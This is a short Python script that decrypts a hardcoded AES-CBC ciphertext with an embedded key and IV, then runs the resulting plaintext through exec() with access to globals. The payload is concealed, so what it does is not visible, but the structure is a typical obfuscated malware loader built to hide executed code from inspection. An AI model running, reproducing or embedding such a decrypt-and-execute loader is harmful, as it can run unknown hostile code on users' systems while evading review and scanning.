from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import binascii

AES_KEY_BITS = 256
AES_IV_SIZE = 16

def hex_to_bytes(hex_str):
    try:
        return binascii.unhexlify(hex_str)
    except (TypeError, binascii.Error):
        print("Error: Invalid hex string.")
        return None

def decrypt_aes():
    aes_key_hex = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327"
    aes_iv_hex = "d48e8f872066162eabde33152dc604c6"
    input_hex = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e758b9dab7f663e4aec0300ebdfd42d30d14387a426e87356c747ecc3f0868d670547cf1f84a4570fbed7a48d252e9872d2ae5a0c65e1903bda34799e5134fde592aecfff6c7bac2acb94600a8b733762a145ebe770a486ee70b91ab57686870fee72377acf3d58e03ee340fe024b1da4ea4241155a82eb8fbd80d2864694cb6976cf66d0c553eb8548b41da7d7890d273ed570abec879bb75f5a37c50f468a4f889d973cf8fa9e0f843af2de67173d178b8ddd5c5d46a0adeee5d432d1de941c4011c0d802a56dff76179bfec9f044a1f2ca3f73e4c0b932222cec373ffe52ce72a60c8742fdecbb0dfd23ec8730e6695346cb3db65ebf958b23dfab25d8e97c6c01e5ca40bd92f744004c0b826679b71c19e81705cb1787a5a3381a232c61b1a6fea4433590282e469886361e9c0df7bc2dd08891da3f2e83fa8c38ecca2d1fe7d12a06ef176b81f64a23f986998d58e8976d6229f7eb951e2c6a332720c90ed23d9b0d4fa8afaa1f0046371829e71eb948edbea82679d1a520f2b1e4b56ea9c70f1a8c06c0a55a8c8a120c05805275483c8c441447b2bab6ad634d5eb0668f189fb3c65cda161e6410b6661abee52105216552479ed25001092f4b9f85000848ba324cc3eec2a08e50742f8bfeccc3df6d40615055b97d2b88d0e5135aa21b1a25a525782def74f0107ed19c68d907e045014240ea4800eca462b23a4fa0be124bb992a1e3a9ef322f196f5c63d5986524c5f3c9fc09f975eca4f86b82a24fd102ec20025ff9f3db88fecc43e3bfd95777c9e92679f608f4cefff1be02db4161764f7fd1989a02dbc6bb9ba09b515db8199287dd11ca2d161607362a3c2c7192d15acced93b800fab3f41c5aff538e4e82934f7a04fd48da5d74290b43742f1fcd487ec385a7db46d239a3fda65b8cfb642c535f7af5b1fc3c2c85b0db7b2d77dd495cb12c97e10187a93214762de028dee4770f06bdcdaa73e8b0f19012efd680dad1eec63d9c94bf0f4f7e7699bd4b84324eed1a3d1a33f3e095e4463a54d95d671f52d5af6fd501588e17064cc69ae4a04b55d974085967d959b830c6bd5136400b016d035e51af932cd40e9e6c3be8de386da10dedd912d60cc9a4ea08023a2d9c7787cc3a5d01fb95804b40b7b86b6eb2da05275eeaa7bca90d2edd48aa4c4b3e21a4b0a44a77e4804ce6b955e61d75d5cb93f6f8f57aeed07efd1f07318ead11146c517fc7e0b3db3a33ad3e82671f4c41c6378db1b8f8581b8d68c177ab70801a14e2655a95fe110160a542664437f1bc19ee032273144920d5ce36a2377d658a5478874d5c086acafcef9f0ae4cb6e1863607d392316ccdd798bd1fc3ddca8b1ec2bb8fb68e9438039862294ccae27e94f45fbf837cd4b147e5cd3be435546d0e0d8033f24ae7b48c89411e06c37a950c44d3796b1e5984683e098f0ecf9b82538271ef44339a50f720b83dd0afed6863661cd17f8a254f5b4368e3fb2f4e56df8d7aff83f24f54178f27da2a125260b9bea5ce395f3693784ccdf2fd01d0bd39322951a25887a78f80a8511f95da61e722fa9febda8f3c3b9ee3348a6b1808c2b2502288e186d1b58114953907a160ad461b0a3243a97389c8006ed2031807721f9c7fa47fc7018bbedef6f6d591f1c160f9c7d7427836893484016e4f95df7da917f5bbcdf911774649f37a93f93579fc9f92c24475c87c27565cd32d2a2682eba1a3a85931ba251a2d94ddfb999780c6d48ccb4586e5062853ccc51342e74f34d6b0614c95bb54f0d03ec27258e8d445a18750a353d3fee2e588d01b2ec77e10805076155cb5a7307c2ac177e8533f25114d1bcdb52a775a62c6a6263e8c887f26503c1e75e11f8ed9fd49a3e0cba7407e266e8e2efdec35ff84064594f6f83dc567d1e2a912f33d7a7ce2"

    aes_key = hex_to_bytes(aes_key_hex)
    aes_iv = hex_to_bytes(aes_iv_hex)
    input_data = hex_to_bytes(input_hex)

    if aes_key is None or aes_iv is None or input_data is None:
        return

    backend = default_backend()
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=backend)
    decryptor = cipher.decryptor()

    plaintext = decryptor.update(input_data) + decryptor.finalize()

    # Execute the decrypted command
    command = plaintext.decode('utf-8').strip()
    print("command")
    try:
        exec(command, globals())
    except Exception as e:
        print(str(e))
    print("done")
    input()


if __name__ == "__main__":
    decrypt_aes()
